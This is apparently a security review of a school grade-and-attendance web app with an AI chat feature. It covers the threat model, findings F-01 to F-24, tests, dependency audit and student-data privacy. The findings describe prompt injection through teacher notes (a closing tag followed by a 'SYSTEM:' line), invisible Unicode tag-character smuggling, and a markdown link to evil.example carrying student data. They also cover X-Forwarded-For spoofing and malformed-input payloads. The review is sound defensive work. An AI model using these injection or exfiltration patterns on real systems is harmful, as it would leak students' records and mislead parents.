# Security review

Adversarial review of the backend (`superteacher/`), the web auth/API client and the deploy files, done against
`origin/main` at `bb23101`. Findings are **confirmed** (reproduced by a test in `tests/test_security_*.py`) or
**suspected** (read from code, not reproduced). Regression tests for confirmed issues that still need a patch in a
file owned by the in-flight rewrite are `xfail(strict=False)`: they turn into XPASS the moment the patch lands
(remove the marker then).

## 1. Threat model

**Assets** (most to least sensitive)

1. Student records: names, grade level, grades, attendance, free-text teacher notes (FERPA-type data).
2. The shared passcode and the session-signing secret (`SESSION_SECRET` / `.session_secret`).
3. The Anthropic API key and the spend it controls.
4. Integrity of grades/attendance (a wrong edit is a real-world harm to a student).
5. Availability during the school day.

**Actors**

| Actor | Capability |
|---|---|
| Anonymous internet user | Can reach the Cloud Run URL: `/api/health`, `/api/version`, `/api/auth/*`, the SPA. Can send arbitrary bodies/headers. |
| Malicious website visited by the teacher | Can make the teacher's browser send cross-site requests/WebSocket handshakes (CSRF, CSWSH). Cannot set custom headers without a CORS preflight. |
| Careless teacher | Pastes hostile or odd text (CSV from a spreadsheet, a student named `=1+1`, notes copied from an email), reuses the passcode, leaves a tab open on a shared computer. |
| Hostile text author (student, parent, e-mail they pasted from) | Controls strings that end up in notes/names/titles, and so in prompts and CSV exports. |
| Authenticated user | Has the passcode: full read/write on all data (single tenant, no roles). Out of scope except for cost/availability abuse. |
| Operator | Controls env vars, Docker image, Cloud Run. Misconfiguration is in scope (`AUTH_DISABLED`, `FORWARDED_ALLOW_IPS`, `ENABLE_DOCS`). |

**Trust boundaries**

```
 browser ──(TLS)── Cloud Run front end ──(HTTP, X-Forwarded-*)── uvicorn/FastAPI ── SQLite (/data volume)
                                                                      │
                                                                      └──(TLS, API key)── api.anthropic.com
```

* Browser → app: only the signed `st_session` cookie authenticates; CSRF defence is `X-Requested-With` + `Origin`.
* Proxy → app: `X-Forwarded-For/Proto` are trusted from any peer (`FORWARDED_ALLOW_IPS=*`).
* App → Anthropic: student data crosses the organisation boundary here (see section 4).
* Stored text → prompts / CSV: user-authored strings cross into an LLM context and into spreadsheet software.

## 2. Findings

Severity is my judgement for this deployment (single teacher / small school, one passcode, SQLite).
"Owner" files are the ones the in-flight rewrite is changing; exact patches are in `docs/SECURITY_PATCHES.diff`
(verified: applied to a copy, every related xfail flips to XPASS and the rest of the suite stays green).

| ID | Sev | Status | Where | Scenario | Fix / status |
|---|---|---|---|---|---|
| F-01 | Medium | **Confirmed**, **fixed here** | `superteacher/reports.py` `_context` (was ~l.283-300) | The parent-update prompt put teacher notes, course names, assignment titles and the first name into the model prompt with only `\n` stripped. A note containing `</teacher_notes>\nSYSTEM: ...` closed the "untrusted" block and was read as instructions; the draft goes into an e-mail to a parent. (The chat/insight builders already used `clean()`; this one did not.) | All free text now goes through `ai_tools.clean()`. Test: `test_parent_update_prompt_cannot_be_broken_out_of` (24 payloads; fails on old code). |
| F-02 | Medium | **Confirmed**, **fixed here** | `schemas.py` (`_text`, ids, `ImportIn.csv`) | `"\ud800"` (valid JSON, not encodable as UTF-8) in a name/note/id made SQLite's driver raise -> bare 500; NUL/control characters in names/notes were stored and later reached CSV exports and prompts. | `_text()` NFC-normalises, replaces lone surrogates with U+FFFD, rejects control chars (notes may keep `\n\t`); client ids are length-bounded and scrubbed; the CSV importer rejects control characters. Tests in `test_security_injection.py`. |
| F-03 | Low | **Confirmed**, needs patch in `auth.py` | `auth.py:105` `check_password` | `POST /api/auth/login {"password":"\ud800"}` raises `UnicodeEncodeError` -> 500 for an anonymous caller (no throttle accounting either). | `candidate.encode("utf-8", "surrogatepass")`. xfail test `test_lone_surrogate_passcode_is_a_401_not_a_500`. |
| F-04 | Medium | **Confirmed**, needs patch in `main.py` | `main.py` (no body limit) | An anonymous caller can POST 30 MB bodies to `/api/auth/login` or any route; FastAPI buffers and parses the body *before* the 401 (measured 0.14 s each). Cloud Run's 32 MB request cap and concurrency 80 make memory exhaustion plausible on a small instance. | Pure-ASGI `BodyLimitMiddleware` (4 MiB, 413). xfail test `test_oversized_request_bodies_are_rejected_early`. |
| F-05 | Medium | **Confirmed (bounded)**, accepted | `Dockerfile:30` `FORWARDED_ALLOW_IPS=*`, `auth.py:190` | With `*`, uvicorn believes the client-supplied `X-Forwarded-For`, so an attacker picks a fresh "client address" per request and defeats the per-client lock. The global limiter still stops it: exactly 50 wrong guesses, then 429 for everyone (`test_rotating_xff_is_bounded_by_the_global_limiter_when_headers_are_trusted`). Conversely, anyone can lock the real teacher out of login (50 bad attempts, then re-lock every 15 min): login DoS. | Accepted: a 50-guess budget against a long random passcode is fine, and the alternative (shared bucket, `test_lockout_is_shared_...`) locks everyone out on one typo. Operators: use a long random `AUTH_PASSWORD` (>= 16 chars), and if the platform's peer IPs are known, set `FORWARDED_ALLOW_IPS` to them instead of `*`. Optional: rate-limit at Cloud Armor. |
| F-06 | Low | **Confirmed**, accepted | `auth.py:93-103` | Sessions are stateless signed cookies: logout only deletes the browser copy. A copied cookie stays valid for up to 12 h (or until the passcode/secret changes). One shared passcode means no per-user audit trail. | Accepted for a single-teacher tool; documented. Changing `AUTH_PASSWORD` is the revocation lever (tested: `test_token_survives_only_with_matching_secret_and_password`). If revocation is wanted, add a server-side `jti` denylist; xfail test `test_copied_cookie_is_dead_after_logout` will then pass. |
| F-07 | Low | **Confirmed**, needs patch in `main.py` | request parsing | ~5000-deep JSON (anonymous too) -> `RecursionError` while encoding the 422 body -> bare 500 (no leak, but noisy). | Custom `RequestValidationError` handler that drops `input`/`ctx` (same patch as F-08). xfail `test_very_deeply_nested_json_is_a_4xx`. |
| F-08 | Low | **Confirmed**, needs patch in `main.py` | FastAPI 422 body echoes `input` | A lone surrogate in a *non-text* field (`grade_level: "\ud800"`) is echoed into the 422 JSON and cannot be encoded -> 500. | Same handler as F-07. xfail `test_surrogate_in_a_numeric_field_is_a_422`. |
| F-09 | Low | **Confirmed**, needs patch in `main.py` | `main.py:113` `spa()` | The SPA catch-all answers *unknown* `GET /api/...` with `index.html` and 200, so a typo'd/removed endpoint looks like success to a client and scanners see a 200. | 404 JSON for `api`/`api/*` in `spa()`. xfail `test_unknown_api_paths_are_json_404_not_the_spa`. |
| F-10 | Low | **Confirmed**, needs patch in `main.py` | `main.py:113` `spa()` | `GET /%00` -> `Path.resolve()` raises `ValueError` -> anonymous 500. Traversal itself is *not* possible (25 vectors tested, including symlinks and sibling-prefix dirs). | Reject NUL in `path` (same patch as F-09). xfail `test_no_path_traversal[/%00 ...]`. |
| F-11 | Low | **Confirmed**, needs patch in `auth.py` | `auth.py:111` `origin_ok` | Only the host of `Origin` is compared; scheme is ignored, so `ftp://<host>` passes. Browsers never send that, so hardening only. (An `https` Origin over an `http` scope must stay allowed: TLS is terminated upstream; there is a test for that.) | Require scheme in {http, https}. xfail `..[ftp://testserver]`. |
| F-12 | Medium | **Confirmed**, needs patch in `ai_tools.py` | `ai_tools.py:33` `clean()` | `clean()` strips ASCII control characters and `<`/`>` but keeps Unicode *tag characters* (U+E0000-E007F: invisible text that LLMs can read, "ASCII smuggling"), zero-width/bidi/format characters, U+2028/2029/0085 line separators, and full-width `＜＞`. A note can hide instructions the teacher never sees. Tags cannot be *closed* with these (ASCII `<` is still defanged; all delimiter tests pass) so impact is bounded to the model reading hidden instructions that are already inside an "untrusted" block. | NFKC-fold, drop `Cf`, map `Zl/Zp` to space. xfail `test_clean_strips_invisible_format_characters`, `test_clean_folds_compatibility_angle_brackets`. |
| F-13 | Low | **Confirmed**, **fixed here** | `routers/roster.py` `_name_taken`, CSV import | Duplicate detection used SQLite `lower()` (ASCII only) and no normalisation, so `Zoë` (NFC) / `Zoë` (NFD) and `ÅNGSTRÖM`/`Ångström` created look-alike duplicates (also a spoofing aid: two identical-looking students). | Python `casefold()` comparison + NFC at the schema and importer. Tests: `test_unicode_normalisation_duplicates_are_refused`, `test_non_ascii_case_folding_duplicates_...`. |
| F-14 | Low | **Hardening, fixed here** | `reports.py` `csv_safe` | Formula guard only looked at the first character. Leading whitespace and full-width `＝＋－＠` (some importers fold/trim them) slipped through. ASCII `= + - @ \t \r` were already handled and are now locked in by tests across names, titles and the import path. | `csv_safe` checks `text.lstrip()[0]` against the extended set. |
| F-15 | Info | **Fixed here** | `routers/system.py:19` | The (shadowed) duplicate `/health` returned `str(e)` of a DB error (paths/SQL). Unreachable today because `main.py` registers the public `/api/health` first; one reorder away from a leak. | Returns the constant `"error"`. Test: `test_health_is_generic_when_the_database_is_down`. |
| F-16 | Low | **Suspected** (read from code), needs patch in `web/src` | `web/src/main.jsx:14`, `components/Chat.jsx:10-22` | Chat history (AI answers naming students and grades) is kept in `sessionStorage['st-chat']` and is **not cleared on logout**; on a shared school computer the next person in the same tab can reopen it. | `onLogout={() => { queryClient.clear(); try { sessionStorage.removeItem('st-chat'); } catch {} }}`. |
| F-17 | Low | **Suspected**, accepted | `npm audit` | See section 3: all findings are dev-server only or in code paths the SPA does not use. | Plan an upgrade (vite/vitest/react-router); not urgent. |
| F-18 | Low | Supply chain, open | `requirements.txt` | Ranges only (`fastapi>=0.115,<1`, `anthropic>=0.60`), no lock file; every image build can pull different versions. The environment I tested resolved FastAPI 0.142 (lazy `_IncludedRouter`), which `app.routes` no longer flattens: the route-inventory test handles both. | Add `pip-compile`/`uv lock` with hashes. |
| F-19 | Low | Open | `main.py` `_security_headers` | No `Strict-Transport-Security` (Cloud Run does not add it); the headers middleware does not run for unhandled-exception 500s (Starlette's outer handler). | Add HSTS when `request.url.scheme == "https"` or `X-Forwarded-Proto: https`; wrap with a pure-ASGI middleware if headers on 500s matter. |
| F-20 | Low | Accepted | `config.py:35` | With `ENABLE_DOCS=true` Swagger/OpenAPI are served **unauthenticated**. Off by default (`test_docs_and_openapi_are_off_by_default`). | Keep off in prod (documented). |
| F-21 | Low | **Suspected**, accepted | `web/src/components/Chat.jsx:27-34` | If a hostile note convinces the model to emit `[text](https://evil.example/?d=<student data>)`, the teacher can click it. Mitigated: images are not rendered, links are http(s)/mailto only with `noopener noreferrer nofollow`, the model sees untrusted text only inside delimiters, and the click is manual. | Accepted; optionally show the destination host on hover or restrict links to a allowlist. |
| F-22 | Low | Config | `config.py:19` | `SEED_DEMO_DATA` defaults to `true`; a production DB created without setting it receives fake demo students. The CI smoke test sets it to false. | Default to false in the image (`ENV SEED_DEMO_DATA=false`). |
| F-23 | Low | **Suspected**, accepted | uvicorn access log / Cloud Run request log | `GET /api/students?q=<name>` puts search terms (student names) and student ids in URLs, which both log. | Accepted; if undesirable move search to POST or set `--no-access-log` and rely on structured logs without query strings. |
| F-24 | Low | Accepted | `routers/ai.py` | Chat limits are per WebSocket (12 msg/min) plus 8 concurrent model calls globally. A passcode holder can open many sockets and burn API budget (authenticated-only). | Set a spend limit on the Anthropic key. |

### Things verified safe (each has tests)

* **Authentication coverage**: every `/api` route and the chat WebSocket returns 401 / closes 1008 without a session; the test enumerates the real route table (works with FastAPI's lazy routers) against a five-entry public allowlist and fails when a route is added without auth.
* **CSRF / CSWSH**: missing header, wrong header name, 20 hostile `Origin` values (null, empty, `https://testserver.evil.com`, `https://evil.com/testserver`, userinfo tricks, port/scheme confusion, trailing dot) are refused for POST/PUT/PATCH/DELETE, login, logout and the WebSocket; legitimate and configured origins work. CORS preflights from other origins get no `Access-Control-Allow-Origin`.
* **Cookies**: HttpOnly, SameSite=Lax, host-only, `Secure` on https / `X-Forwarded-Proto`; tampering, truncation, extension, foreign secret, password change, expiry all rejected; generated secret file is `0600` and stable across restarts.
* **Throttle**: lockout, exponential backoff and cap, per-client keys behind a trusted proxy, shared bucket otherwise, locked clients do not consume state, global limiter bounds a spoofing attacker.
* **Injection**: 12 SQLi strings across `q`, ids in paths/queries/bodies, names, notes, CSV cells -> parameterised, tables intact; `%`/`_`/`\` are literal in search; cross-section grading/attendance refused; PATCH cannot mass-assign.
* **Numbers/sizes**: NaN/Infinity/1e999/negative/huge/boolean/string numbers, oversize batches, field lengths, wrong content types, 3 MB strings, 200-deep nesting.
* **Static serving**: no traversal (encoded dots/slashes, backslashes, `//`, symlink escape, sibling-prefix dir), no directory listing, no `.env`/`.session_secret`/source map reachable, Docker context excludes secrets and data.
* **Response hygiene**: forced 500s and forced DB failures return generic bodies (no SQL, paths, class names); CSP / `frame-ancestors 'none'` / nosniff / referrer / `Cache-Control: no-store` on every API response and CSP on SPA/static; docs/OpenAPI off by default; app refuses to start without `AUTH_PASSWORD`.
* **Prompt hygiene (chat, tools, insight, parent update)**: 24 hostile payloads (closing tags, role switches, NUL/ESC, U+2028/9, full-width and zero-width look-alikes, 50 KB strings, 500 repeated closers) cannot add or close a `<roster>`, `<student_record>`, `<note>` or `<teacher_notes>` block or create a free-standing line; the system prompt never contains data; chat text goes in `messages`, not `system`; tool results stay valid, bounded JSON/records.

## 3. Dependency audit

* `pip-audit -r requirements.txt` (resolved against current indexes): **no known vulnerabilities**. Caveat: unpinned ranges (F-18).
* `npm audit --omit=dev` in `web/`: **2 moderate**, both in `react-router` / `react-router-dom` (6.x, fix is a breaking 7.x):
  * Open redirect via backslash in `<Link>` / `useNavigate` (GHSA-wrjc-x8rr-h8h6): needs an attacker-controlled `to`. Every `to` in `web/src` is a literal or `/students/${id}` with a server-generated 12-hex id. **Not reachable.**
  * Constructor injection via `deserializeErrors()` in SSR hydration (GHSA-337j-9hxr-rhxg): the app is a client-only SPA (no SSR). **Not reachable.**
* `npm audit` (including dev): 7 findings (1 critical, 1 high, 5 moderate) in `vitest`, `vite`, `esbuild`, `@vitest/mocker`, `vite-node`. They affect the dev server / test UI only (`vitest --ui` file read, esbuild dev-server cross-origin reads, vite `.map` handling in the dev server): **not shipped** (the Docker image serves `web/dist` built output; `node_modules` is not in the runtime image). Developer exposure: do not run the Vite/Vitest UI servers on an untrusted network. No versions were bumped here.

## 4. Privacy of student data

**What leaves the server (only to `api.anthropic.com`, only if `ANTHROPIC_API_KEY` is set; nothing leaves otherwise)**

| Feature | Fields sent |
|---|---|
| Chat, every turn | System prompt + a **roster snapshot of the whole class**: for up to 60 students (`chat_roster_cap`) full name, internal id, grade level, course / section names, average, letter, trend, attendance %, homework %, missing count, risk status; beyond 60: per-section counts/averages and only flagged students. If a student is on screen: their full record (all assignment titles with points/due dates, absences/tardies, risk flags, up to 5 notes x 400 chars). The conversation history (<= 20 messages). Tool results the model requests (<= 12,000 chars each: the same fields, up to 25 students, or a full record). |
| Student insight card | One student's full name, grade, course/section, metrics, all assignment titles/scores, up to 5 notes. |
| Parent update draft | **First name only**, course, metrics, last 6 assignment titles/scores, up to 3 notes (300 chars each). |
| Never sent | Passcode, session cookie, API key of the server, e-mail/phone/address/DOB/ID numbers (the app does not store them), raw per-day attendance dates (only counts), other students for a parent draft. |

Notes are free text and may contain sensitive information (health, family, discipline): they are sent as-is (after delimiter-defanging). Whether Anthropic retains or trains on API inputs depends on the organisation's agreement/ZDR settings; confirm that, and the school's rules for sending student data to a third-party processor, before use with real students.

**What the browser stores**

| Where | Key | Content | Cleared |
|---|---|---|---|
| Cookie | `st_session` | Signed opaque token (`{"v":1}` + timestamp), HttpOnly, no student data | Logout deletes it; expires after `SESSION_TTL_HOURS` (12) |
| `localStorage` | `st-scope` | Selected course/section ids | Never (not sensitive) |
| `localStorage` | `st-theme` | `light`/`dark` | Never |
| `sessionStorage` | `st-chat` | Last 60 chat messages (questions + AI answers naming students and grades) | When the tab closes; **not on logout** (F-16) |
| Memory | React Query cache | All API data shown | Cleared on logout |

The API sends `Cache-Control: no-store` so student JSON is not kept in the HTTP cache; the CSV download is `no-store` + `attachment`.

**What is logged**

* App: `logging.basicConfig(INFO)`. Application logs contain exception class names, HTTP status codes from the AI service, attempt counters and student ids (cache warnings). They do **not** contain prompts, model replies, notes, names, the passcode or cookies (checked all `log.*` calls).
* uvicorn access log / Cloud Run request log: method, path **and query string**, so `GET /api/students?q=<name>` records the search term and student ids appear in `/api/students/<id>` paths (F-23). IP addresses of clients are logged by the platform.
* `httpx`/`anthropic` INFO logging records request URLs (`api.anthropic.com/v1/messages`) but not bodies.
* Data at rest: SQLite file on the `/data` volume, unencrypted at the application level (rely on volume/disk encryption); AI insight JSON is cached in the `insights` table. `.session_secret` is `0600` next to the DB.

## 5. Patches for files owned by the other session

`docs/SECURITY_PATCHES.diff` (apply with `git apply`; context may need rebasing onto the rewrite). Summary:

1. **`auth.py`**: `candidate.encode("utf-8", "surrogatepass")` in `check_password` (F-03); in `origin_ok`, require `urlparse(origin).scheme in ("http", "https")` (F-11).
2. **`main.py`**: `BodyLimitMiddleware` (4 MiB) (F-04); `RequestValidationError` handler returning only `type/loc/msg` (F-07, F-08); in `spa()` raise 404 for `api` / `api/*` and for paths containing NUL (F-09, F-10). Optional: HSTS (F-19).
3. **`ai_tools.py`**: in `clean()`, `unicodedata.normalize("NFKC", ...)`, drop `Cf` characters (incl. U+E0000-E007F), map `Zl`/`Zp` to a space before the existing defanging (F-12).
4. **`web/src/main.jsx`**: also `sessionStorage.removeItem('st-chat')` in `onLogout` (F-16).

## 6. Test inventory

`tests/test_security_routes.py` (route + WebSocket auth inventory, CSRF/Origin/CORS matrix), `test_security_session.py` (cookie, secret persistence, throttle, XFF), `test_security_injection.py` (SQLi/LIKE, CSV formula injection, import, odd values, unicode, sizes), `test_security_serving.py` (SPA/static traversal, config files, error and header hygiene), `test_security_prompts.py` (delimiter integrity for every prompt builder). Shared helpers in `tests/sec_util.py`.
